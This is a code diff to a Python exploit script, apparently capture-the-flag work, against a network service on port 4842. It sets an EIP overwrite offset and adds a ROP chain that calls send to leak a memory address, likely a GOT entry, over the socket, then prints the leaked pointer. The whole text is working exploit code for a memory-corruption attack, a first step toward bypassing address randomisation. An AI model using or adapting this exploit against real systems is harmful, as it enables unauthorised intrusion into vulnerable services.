@@ -24,14 +24,25 @@ s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((sys.argv[1], 4842))
 s.recv(1024)
 
-eip_off=
+eip_off=326
 hrop = [
-
+    0x08048770, #send
+    0xdeadbeef,
+    0x4,
+    0x0804B0B8,
+    4,
+    0
   ]
 rop=""
 for i in hrop:
   rop += struct.pack('I', i)
 
+sys.stderr.write("[+] sending %d bytes\n" % len(buf))
 s.send(buf)
 rbuf= s.recv(1024)
+if len(rbuf) == 0:
+    sys.stderr.write("[+] :( nothing received\n")
+else:
+    sys.stderr.write("[+] received %d bytes\n" % len(rbuf) )
+    print(hex(struct.unpack("I", rbuf)[0] ))
 s.close()
